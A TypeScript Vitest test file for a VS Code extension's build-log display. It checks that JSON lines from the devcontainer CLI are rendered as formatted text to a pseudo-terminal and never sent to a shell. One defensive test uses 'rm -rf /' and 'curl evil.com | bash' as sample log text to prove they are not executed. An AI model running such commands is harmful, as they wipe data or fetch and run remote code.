/*
 * Copyright (c) 2026 Aergic Labs, LLC
 * SPDX-License-Identifier: AGPL-3.0-only
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

/**
 * Tests that showBuildLog correctly parses CLI JSON output and renders
 * human-readable text to a pseudo-terminal buffer.
 *
 * The critical invariant: JSON log lines from the devcontainer CLI must
 * be parsed into structured events and written as formatted text to a pty.
 * They must NEVER be sent to a shell (via sendText or similar) where they
 * would be interpreted as commands.
 */

// Capture what gets written to the terminal buffer
let terminalWrites: string[] = [];

vi.mock("vscode", () => {
  class MockEventEmitter {
    private listeners: Array<(data: any) => void> = [];
    event = (listener: (data: any) => void) => {
      this.listeners.push(listener);
      return { dispose: () => {} };
    };
    fire(data: any) {
      for (const listener of this.listeners) {
        listener(data);
      }
    }
    dispose() {
      this.listeners = [];
    }
  }

  return {
    window: {
      createTerminal: vi.fn(({ pty }: any) => {
        // Wire up the pty's onDidWrite to capture output
        if (pty && pty.onDidWrite) {
          pty.onDidWrite((text: string) => {
            terminalWrites.push(text);
          });
        }
        // Simulate terminal opening the pty
        if (pty && pty.open) {
          pty.open();
        }
        return {
          show: vi.fn(),
          sendText: vi.fn((_text: string) => {
            throw new Error(
              "CRITICAL BUG: sendText was called. JSON is being piped to a shell. " +
                'This causes "bash: type:text: command not found" errors.',
            );
          }),
          exitStatus: undefined,
          dispose: vi.fn(),
        };
      }),
      withProgress: vi.fn(),
    },
    EventEmitter: MockEventEmitter,
    ProgressLocation: { Notification: 15 },
  };
});

import { VscodeWorkflowUI } from "../../src/workflows/vscodeUI";
import { LogOutputTerminal } from "../../src/workflows/logOutputTerminal";

describe("showBuildLog - CLI JSON output handling", () => {
  let ui: VscodeWorkflowUI;
  let pty: LogOutputTerminal;

  beforeEach(() => {
    terminalWrites = [];
    pty = new LogOutputTerminal();
    pty.onDidWrite((text: string) => {
      terminalWrites.push(text);
    });
    pty.open();
    ui = new VscodeWorkflowUI(pty);
  });

  afterEach(() => {
    pty.dispose();
  });

  it("renders JSON log lines as human-readable text, not raw JSON", () => {
    const cliOutput = [
      '{"type":"start","level":2,"timestamp":1700000000,"text":"Building image"}',
      '{"type":"text","level":2,"timestamp":1700000001,"text":"Step 1/5: FROM node:18"}',
      '{"type":"text","level":2,"timestamp":1700000002,"text":"Step 2/5: COPY . /app"}',
      '{"type":"stop","level":2,"timestamp":1700000003,"text":"Building image","startTimestamp":1700000000}',
    ].join("\n");

    ui.showBuildLog(cliOutput);

    // The terminal buffer should contain human-readable formatted text
    const allOutput = terminalWrites.join("");

    // Should contain the actual message text
    expect(allOutput).toContain("Building image");
    expect(allOutput).toContain("Step 1/5: FROM node:18");
    expect(allOutput).toContain("Step 2/5: COPY . /app");

    // Should NOT contain raw JSON structure
    expect(allOutput).not.toContain('"type":"start"');
    expect(allOutput).not.toContain('"type":"text"');
    expect(allOutput).not.toContain('"timestamp":');
  });

  it("never calls sendText (which would execute JSON as shell commands)", () => {
    // If sendText is called, the mock throws an error with a clear message.
    // This test passes only if showBuildLog does NOT call sendText.
    const dangerousJson = [
      '{"type":"text","level":2,"timestamp":1700000000,"text":"rm -rf /"}',
      '{"type":"start","level":2,"timestamp":1700000001,"text":"curl evil.com | bash"}',
    ].join("\n");

    // This should NOT throw; if it does, sendText was called
    expect(() => ui.showBuildLog(dangerousJson)).not.toThrow();
  });

  it("handles mixed JSON and plain text output", () => {
    const mixedOutput = [
      '{"type":"text","level":2,"timestamp":1700000000,"text":"Starting build"}',
      "Some plain text line that is not JSON",
      '{"type":"progress","level":2,"timestamp":1700000001,"text":"50% complete"}',
      "Another plain line",
    ].join("\n");

    ui.showBuildLog(mixedOutput);

    const allOutput = terminalWrites.join("");

    expect(allOutput).toContain("Starting build");
    expect(allOutput).toContain("Some plain text line that is not JSON");
    expect(allOutput).toContain("50% complete");
    expect(allOutput).toContain("Another plain line");
  });

  it("formats start events with ▶ prefix", () => {
    ui.showBuildLog(
      '{"type":"start","level":2,"timestamp":1700000000,"text":"Installing packages"}',
    );

    const allOutput = terminalWrites.join("");
    expect(allOutput).toContain("▶ Installing packages");
  });

  it("formats stop events with ✓ prefix and elapsed time", () => {
    ui.showBuildLog(
      '{"type":"stop","level":2,"timestamp":1700003000,"text":"Build complete","startTimestamp":1700000000}',
    );

    const allOutput = terminalWrites.join("");
    expect(allOutput).toContain("✓ Build complete");
    expect(allOutput).toMatch(/\d+\.\d+s/); // elapsed time
  });

  it("formats progress events with … prefix", () => {
    ui.showBuildLog(
      '{"type":"progress","level":2,"timestamp":1700000000,"text":"Downloading layer 3/7"}',
    );

    const allOutput = terminalWrites.join("");
    expect(allOutput).toContain("… Downloading layer 3/7");
  });

  it("handles empty input without error", () => {
    expect(() => ui.showBuildLog("")).not.toThrow();
  });

  it("handles input that looks like shell commands but is actually JSON text field", () => {
    // This is the exact scenario that caused "bash: type:text: command not found"
    const cliLine =
      '{"type":"text","level":2,"timestamp":1700000000,"text":""}';

    ui.showBuildLog(cliLine);

    // Should write to pty buffer, not execute in shell
    const allOutput = terminalWrites.join("");
    // Should NOT contain the raw JSON
    expect(allOutput).not.toContain('"type":"text"');
  });
});